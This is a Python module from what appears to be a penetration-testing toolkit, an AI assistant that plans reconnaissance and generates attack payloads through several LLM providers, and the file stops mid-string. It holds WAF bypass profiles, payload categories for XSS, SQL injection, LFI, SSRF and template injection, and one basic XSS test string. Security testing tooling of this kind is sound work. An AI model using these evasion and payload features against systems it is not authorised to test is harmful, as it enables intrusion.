#!/usr/bin/env python3
"""
🧠 Enterprise AI-Powered Reconnaissance Assistant
Advanced AI module for intelligent recon planning, payload generation, and security analysis
Part of the ReconCLI Cyber-Squad from the Future toolkit
"""

import base64
import hashlib
import json
import os
import re
import sqlite3
import threading
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from pathlib import Path
from typing import Any, Dict, List, Optional

import click

# AI Provider imports (with fallback handling)
try:
    import openai

    HAS_OPENAI = True
except ImportError:
    HAS_OPENAI = False

try:
    import anthropic

    HAS_ANTHROPIC = True
except ImportError:
    HAS_ANTHROPIC = False

try:
    import google.generativeai as genai

    HAS_GEMINI = True
except ImportError:
    HAS_GEMINI = False

try:
    from dotenv import load_dotenv

    load_dotenv()
    HAS_DOTENV = True
except ImportError:
    HAS_DOTENV = False


@dataclass
class AIProviderConfig:
    """
    Configuration settings for AI providers.

    This class manages the configuration for different AI service providers
    including API keys, model settings, and connection parameters.

    Attributes:
        name (str): Provider name (e.g., 'openai', 'anthropic', 'gemini')
        api_key (str): API authentication key for the provider
        model (str): Model name to use (e.g., 'gpt-4', 'claude-3-opus')
        available (bool): Whether this provider is available for use
        endpoint (Optional[str]): Custom endpoint URL for local LLMs
        timeout (int): Request timeout in seconds (default: 30)
        max_tokens (int): Maximum tokens per response (default: 2000)
        temperature (float): Model creativity/randomness (0.0-2.0, default: 0.7)

    Example:
        >>> config = AIProviderConfig(
        ...     name="openai",
        ...     api_key="sk-...",
        ...     model="gpt-4",
        ...     available=True,
        ...     timeout=30
        ... )
    """

    name: str
    api_key: str
    model: str
    available: bool
    endpoint: Optional[str] = None  # For local LLMs
    timeout: int = 30
    max_tokens: int = 2000
    temperature: float = 0.7


@dataclass
class CacheConfig:
    """
    Configuration for AI response caching system.

    Manages caching settings to improve performance and reduce API costs
    by storing and reusing AI responses for identical queries.

    Attributes:
        enabled (bool): Whether caching is enabled (default: False)
        cache_dir (str): Directory path for cache storage (default: "")
        max_age_hours (int): Cache expiration time in hours (default: 24)
        max_size_mb (int): Maximum cache size in MB (default: 100)
        cleanup_interval_hours (int): Cache cleanup frequency (default: 6)

    Example:
        >>> cache_config = CacheConfig(
        ...     enabled=True,
        ...     cache_dir="/tmp/ai_cache",
        ...     max_age_hours=12,
        ...     max_size_mb=50
        ... )
    """

    enabled: bool = False
    cache_dir: str = ""
    max_age_hours: int = 24
    max_size_mb: int = 100
    cleanup_interval_hours: int = 6


@dataclass
class ParallelConfig:
    """Configuration for parallel processing"""

    enabled: bool = False
    max_workers: int = 4
    rate_limit_per_minute: int = 60
    batch_size: int = 10


@dataclass
class WAFConfig:
    """Configuration for WAF detection and bypass"""

    profile: str = "auto"  # auto, cloudflare, aws, azure, akamai
    encoding_chains: int = 2
    obfuscation_level: str = "medium"  # low, medium, high, extreme


@dataclass
class ChatlogConfig:
    """Configuration for chatlog-driven recon"""

    enabled: bool = False
    auto_analyze_results: bool = True
    suggest_next_steps: bool = True
    min_results_for_analysis: int = 3
    max_suggestions: int = 5
    confidence_threshold: float = 0.7
    recon_depth: str = "adaptive"  # shallow, normal, deep, adaptive
    tool_preference: str = "comprehensive"  # fast, balanced, comprehensive


@dataclass
class ReconCLIConfig:
    """Main configuration class for advanced AICLI features"""

    # Core settings
    config_version: str = "1.0"
    default_provider: str = "openai"
    verbose_logging: bool = False

    # Feature configurations
    cache: CacheConfig = field(default_factory=CacheConfig)
    parallel: ParallelConfig = field(default_factory=ParallelConfig)
    waf: WAFConfig = field(default_factory=WAFConfig)
    chatlog: ChatlogConfig = field(default_factory=ChatlogConfig)

    # Local LLM settings
    local_llm_enabled: bool = False
    local_llm_endpoint: str = "http://localhost:11434"  # Default Ollama
    local_llm_model: str = "llama2"

    # Performance monitoring
    performance_monitoring: bool = False
    metrics_file: str = ""

    # Advanced features
    payload_scoring: bool = False
    environment_adaptation: bool = True
    steganography_enabled: bool = False


@dataclass
class ReconStep:
    """Individual reconnaissance step with results"""

    step_id: str
    tool: str
    command: str
    timestamp: datetime
    execution_time: float
    results: Dict[str, Any]
    success: bool
    findings_count: int
    findings_quality: str  # low, medium, high, critical
    ai_analysis: Optional[str] = None
    next_suggestions: List[Dict[str, Any]] = field(default_factory=list)


@dataclass
class ReconSession:
    """
    Enhanced reconnaissance session tracking with chatlog functionality.

    Tracks comprehensive reconnaissance session data including steps performed,
    AI analyses, discovered assets, and vulnerability findings. Supports
    chatlog-driven reconnaissance with AI-powered next step suggestions.

    Attributes:
        session_id (str): Unique session identifier
        target (str): Primary target being analyzed
        start_time (datetime): Session start timestamp
        queries (List[Dict]): List of AI queries made during session
        results (List[Dict]): List of AI responses received
        plan (Optional[Dict]): Reconnaissance plan if generated
        recon_steps (List[ReconStep]): Detailed reconnaissance steps performed
        ai_suggestions (List[Dict]): AI-generated next step suggestions
        current_phase (str): Current reconnaissance phase
        completion_percentage (float): Session completion percentage (0-100)
        discovered_assets (Dict[str, List]): Categorized discovered assets
        vulnerability_summary (Dict): Summary of found vulnerabilities

    Session Phases:
        - initial: Starting reconnaissance
        - discovery: Subdomain/asset discovery
        - active_enumeration: Active scanning and enumeration
        - vulnerability_assessment: Security testing
        - reporting: Documentation and analysis

    Example:
        >>> session = ReconSession(
        ...     session_id="abc123",
        ...     target="example.com",
        ...     start_time=datetime.now(),
        ...     queries=[],
        ...     results=[]
        ... )
    """

    session_id: str
    target: str
    start_time: datetime
    queries: List[Dict]
    results: List[Dict]
    plan: Optional[Dict] = None
    recon_steps: List[ReconStep] = field(default_factory=list)
    ai_suggestions: List[Dict] = field(default_factory=list)
    current_phase: str = "initial"
    completion_percentage: float = 0.0
    discovered_assets: Dict[str, List] = field(default_factory=dict)
    vulnerability_summary: Dict = field(default_factory=dict)


class AIReconAssistant:
    """
    Enterprise AI-powered reconnaissance assistant with advanced features.

    This is the main class that provides comprehensive AI assistance for
    security reconnaissance, payload generation, vulnerability analysis,
    and attack simulation. Supports multiple AI providers and specialized
    security personas.

    Features:
        - Multi-provider AI support (OpenAI, Anthropic, Gemini, Local LLMs)
        - Specialized security personas (RedTeam, BugBounty, Pentester, etc.)
        - Advanced caching system for performance optimization
        - Session management and chat history persistence
        - Payload generation with WAF bypass techniques
        - Attack chain prediction and automated exploitation
        - Compliance reporting and MITRE ATT&CK mapping
        - Interactive chat mode with context awareness

    Attributes:
        config (ReconCLIConfig): Main configuration settings
        providers (List[AIProviderConfig]): Available AI providers
        current_session (Optional[ReconSession]): Active session if any
        cache_manager: Caching system manager
        executor: Thread pool for parallel processing
        rate_limiter: API rate limiting manager
        performance_metrics (Dict): Performance monitoring data

    Example:
        >>> assistant = AIReconAssistant()
        >>> response = assistant.ask_ai(
        ...     "Generate XSS payloads for HTML context",
        ...     persona="bugbounty"
        ... )
        >>> plan = assistant.generate_recon_plan(
        ...     "example.com",
        ...     scope="comprehensive"
        ... )
    """

    def __init__(self, config_file: Optional[str] = None):
        """
        Initialize the AI reconnaissance assistant.

        Args:
            config_file (Optional[str]): Path to configuration file.
                If None, uses default configuration.
        """
        # Initialize session directory first
        self.session_dir = Path.home() / ".reconcli" / "ai_sessions"
        self.session_dir.mkdir(parents=True, exist_ok=True)

        # Load configuration
        self.config = self._load_config(config_file)

        # Initialize core components
        self.providers = self._initialize_providers()
        self.current_session: Optional[ReconSession] = None

        # Initialize cache system
        self.cache_manager = None
        if self.config.cache.enabled:
            self.cache_manager = self._initialize_cache()

        # Initialize parallel processing
        self.executor = None
        self.rate_limiter = None
        if self.config.parallel.enabled:
            self.executor = ThreadPoolExecutor(
                max_workers=self.config.parallel.max_workers
            )
            self.rate_limiter = self._initialize_rate_limiter()

        # Initialize performance monitoring
        self.performance_metrics = {}
        if self.config.performance_monitoring:
            self._initialize_performance_monitoring()

        # Thread safety
        self._lock = threading.RLock()

        # WAF Profile Manager
        self.waf_profiles = self._initialize_waf_profiles()

        # Payload effectiveness tracker
        self.payload_tracker = {}

        # Local LLM client
        self.local_llm_client = None
        if self.config.local_llm_enabled:
            self.local_llm_client = self._initialize_local_llm()

        # Predefined recon templates (existing code)...
        self.recon_templates = {
            "subdomain_enum": {
                "description": "Comprehensive subdomain enumeration",
                "tools": ["subfinder", "amass", "dnscli", "permutcli"],
                "phases": ["passive", "active", "validation", "permutation"],
            },
            "web_discovery": {
                "description": "Web application discovery and analysis",
                "tools": ["httpcli", "urlcli", "dirbcli", "jscli"],
                "phases": ["discovery", "enumeration", "analysis", "validation"],
            },
            "vulnerability_scan": {
                "description": "Vulnerability assessment and exploitation",
                "tools": ["vulncli", "vulnsqlicli", "takeovercli"],
                "phases": ["scanning", "validation", "exploitation", "reporting"],
            },
            "cloud_recon": {
                "description": "Cloud infrastructure reconnaissance",
                "tools": ["cloudcli", "permutcli", "dnscli"],
                "phases": ["discovery", "enumeration", "analysis", "validation"],
            },
        }

        # Payload categories with advanced templates
        self.payload_categories = {
            "xss": {
                "description": "Cross-Site Scripting payloads",
                "contexts": ["html", "javascript", "attribute", "url", "css"],
                "techniques": ["reflection", "dom", "stored", "blind"],
            },
            "sqli": {
                "description": "SQL Injection payloads",
                "contexts": ["mysql", "postgresql", "mssql", "oracle", "sqlite"],
                "techniques": ["union", "boolean", "time", "error"],
            },
            "lfi": {
                "description": "Local File Inclusion payloads",
                "contexts": ["linux", "windows", "php", "java"],
                "techniques": ["traversal", "wrapper", "filter", "log"],
            },
            "ssrf": {
                "description": "Server-Side Request Forgery payloads",
                "contexts": ["internal", "cloud", "bypass", "blind"],
                "techniques": ["http", "file", "gopher", "dns"],
            },
            "ssti": {
                "description": "Server-Side Template Injection payloads",
                "contexts": ["jinja2", "twig", "smarty", "freemarker"],
                "techniques": ["detection", "exploitation", "sandbox"],
            },
        }

    def update_cache_config(self):
        """
        Update cache configuration after config changes.

        Re-initializes or disables the cache manager based on current
        configuration settings. Useful when cache settings are modified
        at runtime.

        Note:
            This method is called automatically when configuration changes
            are detected, but can also be called manually if needed.
        """
        # Re-initialize cache manager if cache is now enabled
        if self.config.cache.enabled and not self.cache_manager:
            self.cache_manager = self._initialize_cache()
        # Disable cache manager if cache is now disabled
        elif not self.config.cache.enabled and self.cache_manager:
            self.cache_manager = None

    def _load_config(self, config_file: Optional[str] = None) -> ReconCLIConfig:
        """Load configuration from file or use defaults"""
        config = ReconCLIConfig()

        if config_file and Path(config_file).exists():
            try:
                with open(config_file, "r") as f:
                    config_data = json.load(f)

                # Update config with loaded data
                if "cache" in config_data:
                    cache_data = config_data["cache"]
                    config.cache = CacheConfig(**cache_data)

                if "parallel" in config_data:
                    parallel_data = config_data["parallel"]
                    config.parallel = ParallelConfig(**parallel_data)

                if "waf" in config_data:
                    waf_data = config_data["waf"]
                    config.waf = WAFConfig(**waf_data)

                # Update other fields
                for field_name in [
                    "default_provider",
                    "verbose_logging",
                    "local_llm_enabled",
                    "local_llm_endpoint",
                    "local_llm_model",
                    "performance_monitoring",
                ]:
                    if field_name in config_data:
                        setattr(config, field_name, config_data[field_name])

            except Exception as e:
                if config.verbose_logging:
                    print(f"Warning: Could not load config file {config_file}: {e}")

        # Set default cache directory if not specified
        if not config.cache.cache_dir:
            config.cache.cache_dir = str(self.session_dir / "cache")

        return config

    def save_config(self, config_file: str) -> bool:
        """Save current configuration to file"""
        try:
            config_data = {
                "config_version": self.config.config_version,
                "default_provider": self.config.default_provider,
                "verbose_logging": self.config.verbose_logging,
                "cache": {
                    "enabled": self.config.cache.enabled,
                    "cache_dir": self.config.cache.cache_dir,
                    "max_age_hours": self.config.cache.max_age_hours,
                    "max_size_mb": self.config.cache.max_size_mb,
                    "cleanup_interval_hours": self.config.cache.cleanup_interval_hours,
                },
                "parallel": {
                    "enabled": self.config.parallel.enabled,
                    "max_workers": self.config.parallel.max_workers,
                    "rate_limit_per_minute": self.config.parallel.rate_limit_per_minute,
                    "batch_size": self.config.parallel.batch_size,
                },
                "waf": {
                    "profile": self.config.waf.profile,
                    "encoding_chains": self.config.waf.encoding_chains,
                    "obfuscation_level": self.config.waf.obfuscation_level,
                },
                "local_llm_enabled": self.config.local_llm_enabled,
                "local_llm_endpoint": self.config.local_llm_endpoint,
                "local_llm_model": self.config.local_llm_model,
                "performance_monitoring": self.config.performance_monitoring,
                "payload_scoring": self.config.payload_scoring,
                "environment_adaptation": self.config.environment_adaptation,
                "steganography_enabled": self.config.steganography_enabled,
            }

            with open(config_file, "w") as f:
                json.dump(config_data, f, indent=2)

            return True
        except Exception as e:
            if self.config.verbose_logging:
                print(f"Error saving config: {e}")
            return False

        # Payload categories with advanced templates
        self.payload_categories = {
            "xss": {
                "description": "Cross-Site Scripting payloads",
                "contexts": ["html", "javascript", "attribute", "url", "css"],
                "techniques": ["reflection", "dom", "stored", "blind"],
            },
            "sqli": {
                "description": "SQL Injection payloads",
                "contexts": ["mysql", "postgresql", "mssql", "oracle", "sqlite"],
                "techniques": ["union", "boolean", "time", "error"],
            },
            "lfi": {
                "description": "Local File Inclusion payloads",
                "contexts": ["linux", "windows", "php", "java"],
                "techniques": ["traversal", "wrapper", "filter", "log"],
            },
            "ssrf": {
                "description": "Server-Side Request Forgery payloads",
                "contexts": ["internal", "cloud", "bypass", "blind"],
                "techniques": ["http", "file", "gopher", "dns"],
            },
            "ssti": {
                "description": "Server-Side Template Injection payloads",
                "contexts": ["jinja2", "twig", "smarty", "freemarker"],
                "techniques": ["detection", "exploitation", "sandbox"],
            },
        }

    def _initialize_cache(self):
        """Initialize AI response cache system"""
        cache_dir = Path(self.config.cache.cache_dir)
        cache_dir.mkdir(parents=True, exist_ok=True)

        class CacheManager:
            def __init__(self, config: CacheConfig):
                self.config = config
                self.cache_dir = Path(config.cache_dir)
                # Ensure cache directory exists
                self.cache_dir.mkdir(parents=True, exist_ok=True)
                self.cache_index_file = self.cache_dir / "cache_index.json"
                self.cache_index = self._load_cache_index()

            def _load_cache_index(self) -> Dict:
                if self.cache_index_file.exists():
                    try:
                        with open(self.cache_index_file, "r") as f:
                            return json.load(f)
                    except Exception:
                        # Cache file corrupted or unreadable, start fresh
                        pass
                return {}

            def _save_cache_index(self):
                with open(self.cache_index_file, "w") as f:
                    json.dump(self.cache_index, f, indent=2)

            def _generate_cache_key(
                self, prompt: str, context: str, persona: str, provider: str
            ) -> str:
                """Generate cache key from prompt parameters"""
                key_data = f"{prompt}|{context}|{persona}|{provider}"
                return hashlib.sha256(key_data.encode()).hexdigest()

            def get(
                self, prompt: str, context: str, persona: str, provider: str
            ) -> Optional[str]:
                """Get cached response if available and not expired"""
                cache_key = self._generate_cache_key(prompt, context, persona, provider)

                if cache_key not in self.cache_index:
                    return None

                cache_entry = self.cache_index[cache_key]
                created_time = datetime.fromisoformat(cache_entry["created"])

                # Check if expired
                max_age = timedelta(hours=self.config.max_age_hours)
                if datetime.now() - created_time > max_age:
                    self._remove_cache_entry(cache_key)
                    return None

                # Load cached response
                cache_file = self.cache_dir / f"{cache_key}.json"
                if cache_file.exists():
                    try:
                        with open(cache_file, "r") as f:
                            cache_data = json.load(f)
                            return cache_data["response"]
                    except:
                        self._remove_cache_entry(cache_key)

                return None

            def set(
                self,
                prompt: str,
                context: str,
                persona: str,
                provider: str,
                response: str,
            ):
                """Cache AI response"""
                cache_key = self._generate_cache_key(prompt, context, persona, provider)

                cache_data = {
                    "prompt": prompt,
                    "context": context,
                    "persona": persona,
                    "provider": provider,
                    "response": response,
                    "created": datetime.now().isoformat(),
                    "access_count": 1,
                }

                # Ensure cache directory exists
                self.cache_dir.mkdir(parents=True, exist_ok=True)

                # Save cache file
                cache_file = self.cache_dir / f"{cache_key}.json"
                with open(cache_file, "w") as f:
                    json.dump(cache_data, f, indent=2)

                # Update index
                self.cache_index[cache_key] = {
                    "created": cache_data["created"],
                    "size": cache_file.stat().st_size,
                    "access_count": 1,
                }
                self._save_cache_index()

                # Cleanup if needed
                self._cleanup_if_needed()

            def _remove_cache_entry(self, cache_key: str):
                """Remove cache entry"""
                cache_file = self.cache_dir / f"{cache_key}.json"
                if cache_file.exists():
                    cache_file.unlink()

                if cache_key in self.cache_index:
                    del self.cache_index[cache_key]
                    self._save_cache_index()

            def _cleanup_if_needed(self):
                """Cleanup cache if size limit exceeded"""
                total_size = sum(entry["size"] for entry in self.cache_index.values())
                max_size_bytes = self.config.max_size_mb * 1024 * 1024

                if total_size > max_size_bytes:
                    # Remove oldest entries first
                    sorted_entries = sorted(
                        self.cache_index.items(),
                        key=lambda x: (x[1]["access_count"], x[1]["created"]),
                    )

                    for cache_key, entry in sorted_entries:
                        self._remove_cache_entry(cache_key)
                        total_size -= entry["size"]
                        if total_size <= max_size_bytes * 0.8:  # Leave 20% buffer
                            break

        return CacheManager(self.config.cache)

    def _init_database_storage(self, db_path: str):
        """Initialize SQLite database for storing AI results and analysis data"""
        import sqlite3

        try:
            # Create database directory if it doesn't exist
            db_file = Path(db_path)
            db_file.parent.mkdir(parents=True, exist_ok=True)

            # Initialize database connection
            self.db_connection = sqlite3.connect(db_path)
            self.db_path = db_path

            # Create tables for AI results storage
            cursor = self.db_connection.cursor()

            # Main AI queries table
            cursor.execute(
                """
                CREATE TABLE IF NOT EXISTS ai_queries (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                    session_id TEXT,
                    target TEXT,
                    prompt TEXT,
                    context TEXT,
                    persona TEXT,
                    provider TEXT,
                    response TEXT,
                    response_time_ms INTEGER,
                    tokens_used INTEGER,
                    cached BOOLEAN DEFAULT FALSE
                )
            """
            )

            # Payload generation results
            cursor.execute(
                """
                CREATE TABLE IF NOT EXISTS payload_results (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                    session_id TEXT,
                    payload_type TEXT,
                    context TEXT,
                    technique TEXT,
                    persona TEXT,
                    payload TEXT,
                    variants TEXT,
                    bypass_techniques TEXT,
                    effectiveness_score REAL,
                    tested BOOLEAN DEFAULT FALSE,
                    success_rate REAL
                )
            """
            )

            # Vulnerability scan results
            cursor.execute(
                """
                CREATE TABLE IF NOT EXISTS vuln_scan_results (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                    session_id TEXT,
                    target TEXT,
                    scan_type TEXT,
                    vulnerability_type TEXT,
                    severity TEXT,
                    description TEXT,
                    payload_used TEXT,
                    confidence_score REAL,
                    remediation TEXT,
                    mitre_techniques TEXT
                )
            """
            )

            # Reconnaissance plans
            cursor.execute(
                """
                CREATE TABLE IF NOT EXISTS recon_plans (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                    session_id TEXT,
                    target TEXT,
                    scope TEXT,
                    persona TEXT,
                    plan_json TEXT,
                    ai_recommendations TEXT,
                    execution_status TEXT DEFAULT 'planned'
                )
            """
            )

            # Attack chain predictions
            cursor.execute(
                """
                CREATE TABLE IF NOT EXISTS attack_chains (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                    session_id TEXT,
                    target TEXT,
                    chain_name TEXT,
                    attack_path TEXT,
                    success_probability REAL,
                    impact_assessment TEXT,
                    mitre_mapping TEXT,
                    detection_difficulty TEXT
                )
            """
            )

            self.db_connection.commit()

            if self.config.verbose_logging:
                print(f"✅ Database initialized: {db_path}")

        except Exception as e:
            print(f"❌ Database initialization failed: {e}")
            self.db_connection = None

    def _store_ai_query(
        self,
        prompt: str,
        context: str,
        persona: str,
        provider: str,
        response: str,
        response_time_ms: int,
        cached: bool = False,
    ):
        """Store AI query and response in database"""
        if not hasattr(self, "db_connection") or not self.db_connection:
            return

        try:
            cursor = self.db_connection.cursor()
            cursor.execute(
                """
                INSERT INTO ai_queries 
                (session_id, target, prompt, context, persona, provider, response, response_time_ms, cached)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            """,
                (
                    (
                        self.current_session.session_id
                        if self.current_session
                        else "no_session"
                    ),
                    self.current_session.target if self.current_session else "unknown",
                    prompt,
                    context,
                    persona or "default",
                    provider,
                    response,
                    response_time_ms,
                    cached,
                ),
            )
            self.db_connection.commit()
        except Exception as e:
            if self.config.verbose_logging:
                print(f"Database storage error: {e}")

    def _store_payload_result(
        self,
        payload_type: str,
        context: str,
        technique: str,
        persona: str,
        payload_data: Dict,
    ):
        """Store payload generation results in database"""
        if not hasattr(self, "db_connection") or not self.db_connection:
            return

        try:
            cursor = self.db_connection.cursor()
            cursor.execute(
                """
                INSERT INTO payload_results 
                (session_id, payload_type, context, technique, persona, payload, variants, bypass_techniques)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            """,
                (
                    (
                        self.current_session.session_id
                        if self.current_session
                        else "no_session"
                    ),
                    payload_type,
                    context or "general",
                    technique or "default",
                    persona or "default",
                    str(payload_data.get("payloads", [])),
                    str(payload_data.get("variants", [])),
                    str(payload_data.get("bypass_techniques", [])),
                ),
            )
            self.db_connection.commit()
        except Exception as e:
            if self.config.verbose_logging:
                print(f"Database storage error: {e}")

    def _store_recon_plan(self, target: str, scope: str, persona: str, plan_data: Dict):
        """Store reconnaissance plan in database"""
        if not hasattr(self, "db_connection") or not self.db_connection:
            return

        try:
            cursor = self.db_connection.cursor()
            cursor.execute(
                """
                INSERT INTO recon_plans 
                (session_id, target, scope, persona, plan_json, ai_recommendations)
                VALUES (?, ?, ?, ?, ?, ?)
            """,
                (
                    (
                        self.current_session.session_id
                        if self.current_session
                        else "no_session"
                    ),
                    target,
                    scope,
                    persona or "default",
                    json.dumps(plan_data, default=str),
                    plan_data.get("ai_recommendations", ""),
                ),
            )
            self.db_connection.commit()
        except Exception as e:
            if self.config.verbose_logging:
                print(f"Database storage error: {e}")

    def get_database_stats(self) -> Dict:
        """Get database statistics"""
        if not hasattr(self, "db_connection") or not self.db_connection:
            return {"error": "No database connection"}

        try:
            cursor = self.db_connection.cursor()
            stats = {}

            # Count records in each table
            for table in [
                "ai_queries",
                "payload_results",
                "vuln_scan_results",
                "recon_plans",
                "attack_chains",
            ]:
                cursor.execute(f"SELECT COUNT(*) FROM {table}")
                stats[f"{table}_count"] = cursor.fetchone()[0]

            # Get database file size
            if hasattr(self, "db_path"):
                db_size = Path(self.db_path).stat().st_size
                stats["database_size_mb"] = round(db_size / (1024 * 1024), 2)

            return stats
        except Exception as e:
            return {"error": str(e)}

    def _initialize_rate_limiter(self):
        """Initialize rate limiter for parallel processing"""

        class RateLimiter:
            def __init__(self, requests_per_minute: int):
                self.requests_per_minute = requests_per_minute
                self.requests = []
                self.lock = threading.Lock()

            def acquire(self):
                with self.lock:
                    now = time.time()
                    # Remove requests older than 1 minute
                    self.requests = [
                        req_time for req_time in self.requests if now - req_time < 60
                    ]

                    if len(self.requests) >= self.requests_per_minute:
                        # Calculate wait time
                        oldest_request = min(self.requests)
                        wait_time = 60 - (now - oldest_request)
                        if wait_time > 0:
                            time.sleep(wait_time)

                    self.requests.append(now)

        return RateLimiter(self.config.parallel.rate_limit_per_minute)

    def _initialize_performance_monitoring(self):
        """Initialize performance monitoring system"""
        self.performance_metrics = {
            "total_requests": 0,
            "successful_requests": 0,
            "failed_requests": 0,
            "cache_hits": 0,
            "cache_misses": 0,
            "average_response_time": 0.0,
            "response_times": [],
            "provider_stats": {},
            "start_time": datetime.now().isoformat(),
        }

    def _initialize_local_llm(self):
        """Initialize local LLM client"""

        class LocalLLMClient:
            def __init__(self, endpoint: str, model: str):
                self.endpoint = endpoint.rstrip("/")
                self.model = model

            def generate(self, prompt: str, max_tokens: int = 2000) -> Optional[str]:
                """Generate response using local LLM"""
                try:
                    import requests

                    payload = {
                        "model": self.model,
                        "prompt": prompt,
                        "max_tokens": max_tokens,
                        "stream": False,
                    }

                    response = requests.post(
                        f"{self.endpoint}/api/generate", json=payload, timeout=30
                    )

                    if response.status_code == 200:
                        result = response.json()
                        return result.get("response", "")

                except Exception as e:
                    # Always log errors for debugging
                    print(f"Local LLM error: {e}")

                return None

        return LocalLLMClient(
            self.config.local_llm_endpoint, self.config.local_llm_model
        )

    def _initialize_waf_profiles(self) -> Dict[str, Dict]:
        """Initialize WAF detection and bypass profiles"""
        return {
            "cloudflare": {
                "signatures": ["cf-ray", "cloudflare", "__cfduid"],
                "bypass_techniques": [
                    "unicode_encoding",
                    "case_variation",
                    "comment_insertion",
                ],
                "encoding_chains": ["url_encode", "double_url_encode"],
                "payload_mutations": ["case_alternation", "encoding_mix"],
            },
            "aws": {
                "signatures": ["x-amzn-requestid", "x-amz-cf-id"],
                "bypass_techniques": ["parameter_pollution", "encoding_variation"],
                "encoding_chains": ["html_encode", "unicode_mix"],
                "payload_mutations": ["parameter_splitting", "mixed_case"],
            },
            "azure": {
                "signatures": ["x-azure-ref", "x-msedge-ref"],
                "bypass_techniques": ["header_manipulation", "encoding_bypass"],
                "encoding_chains": ["base64_chunks", "hex_encoding"],
                "payload_mutations": ["whitespace_variation", "comment_evasion"],
            },
            "akamai": {
                "signatures": ["akamai-ghost", "x-akamai-edgescape"],
                "bypass_techniques": ["chunk_encoding", "case_mutation"],
                "encoding_chains": ["nested_encoding", "protocol_mutation"],
                "payload_mutations": ["protocol_switching", "encoding_layering"],
            },
        }

    def _clean_api_key(self, raw_key: Optional[str]) -> str:
        """Clean and normalize API key from environment variable"""
        if not raw_key:
            return ""

        key = raw_key.strip()

        # Handle keys that are malformed like "OPENAI_API_KEY=sk-..."
        if "=" in key and key.count("=") >= 1:
            parts = key.split("=")
            # Take the last part which should be the actual key
            key = parts[-1].strip()

        # Additional cleaning - remove any remaining prefixes
        if key.startswith("OPENAI_API_KEY"):
            key = key.replace("OPENAI_API_KEY", "").strip()

        # Remove any leading/trailing quotes, spaces, or invisible characters
        key = key.strip("\"'").strip()

        # Remove any non-printable characters except allowed OpenAI key characters
        key = re.sub(r"[^\w\-_]", "", key)

        # Validate that it looks like a proper OpenAI key
        if key.startswith("sk") and len(key) > 20:
            return key

        return ""

    def _initialize_providers(self) -> List[AIProviderConfig]:
        """Initialize available AI providers including local LLMs"""
        providers = []

        # OpenAI GPT
        openai_key = self._clean_api_key(os.getenv("OPENAI_API_KEY"))
        if HAS_OPENAI and openai_key:
            providers.append(
                AIProviderConfig(
                    name="openai",
                    api_key=openai_key,
                    model="gpt-4",
                    available=True,
                    timeout=(
                        self.config.parallel.rate_limit_per_minute
                        if hasattr(self, "config")
                        else 30
                    ),
                    max_tokens=2000,
                    temperature=0.7,
                )
            )

        # Anthropic Claude
        anthropic_key = self._clean_api_key(os.getenv("ANTHROPIC_API_KEY"))
        if HAS_ANTHROPIC and anthropic_key:
            providers.append(
                AIProviderConfig(
                    name="anthropic",
                    api_key=anthropic_key,
                    model="claude-3-opus-20240229",
                    available=True,
                    timeout=30,
                    max_tokens=2000,
                    temperature=0.7,
                )
            )

        # Google Gemini
        gemini_key = self._clean_api_key(os.getenv("GOOGLE_API_KEY"))
        if HAS_GEMINI and gemini_key:
            providers.append(
                AIProviderConfig(
                    name="gemini",
                    api_key=gemini_key,
                    model="gemini-pro",
                    available=True,
                    timeout=30,
                    max_tokens=2000,
                    temperature=0.7,
                )
            )

        # Local LLM (Ollama)
        if hasattr(self, "config") and self.config.local_llm_enabled:
            providers.append(
                AIProviderConfig(
                    name="local",
                    api_key="",
                    model=self.config.local_llm_model,
                    available=True,
                    endpoint=self.config.local_llm_endpoint,
                    timeout=60,
                    max_tokens=2000,
                    temperature=0.7,
                )
            )

        return providers

    def get_available_providers(self) -> List[str]:
        """Get list of available AI providers"""
        return [p.name for p in self.providers if p.available]

    def create_session(self, target: str) -> str:
        """Create new reconnaissance session"""
        session_id = hashlib.md5(
            f"{target}_{datetime.now().isoformat()}".encode(), usedforsecurity=False
        ).hexdigest()[:8]

        self.current_session = ReconSession(
            session_id=session_id,
            target=target,
            start_time=datetime.now(),
            queries=[],
            results=[],
        )

        # Save session immediately
        self.save_session()

        return session_id

    def save_session(self):
        """Save current session to file"""
        if not self.current_session:
            return

        session_file = self.session_dir / f"{self.current_session.session_id}.json"
        session_data = {
            "session_id": self.current_session.session_id,
            "target": self.current_session.target,
            "start_time": self.current_session.start_time.isoformat(),
            "queries": self.current_session.queries,
            "results": self.current_session.results,
            "plan": self.current_session.plan,
        }

        with open(session_file, "w") as f:
            json.dump(session_data, f, indent=2)

    def load_session(self, session_id: str) -> bool:
        """Load existing session"""
        session_file = self.session_dir / f"{session_id}.json"

        if not session_file.exists():
            return False

        try:
            with open(session_file, "r") as f:
                session_data = json.load(f)

            self.current_session = ReconSession(
                session_id=session_data["session_id"],
                target=session_data["target"],
                start_time=datetime.fromisoformat(session_data["start_time"]),
                queries=session_data["queries"],
                results=session_data["results"],
                plan=session_data.get("plan"),
            )

            return True
        except Exception:
            return False

    def ask_ai_mock(self, message: str, context: str = "recon") -> str:
        """Mock AI response for testing when no API keys available"""
        responses = {
            "recon": f"""
🎯 **Reconnaissance Strategy for: {message}**

**Phase 1: Passive Discovery**
- Use subfinder and amass for subdomain enumeration
- Perform DNS enumeration with multiple resolvers
- Gather OSINT data from public sources

**Phase 2: Active Enumeration**
- Permutation-based subdomain generation
- HTTP service discovery and fingerprinting
- Technology stack identification

**Phase 3: Analysis & Validation**
- Vulnerability scanning and assessment
- Subdomain takeover checks
- Security posture evaluation

**Recommended Tools:**
- reconcli dnscli --target domain.com --wordlist-size large
- reconcli permutcli --brand domain --tools subfinder,amass
- reconcli httpcli --target domain.com --tech-detect

**Note:** This is a mock response. Configure AI providers for full functionality.
""",
            "payload": f"""
🎯 **Payload Generation: {message}**

**Context-Specific Payloads:**
```
Basic: <script>alert('XSS')</script>
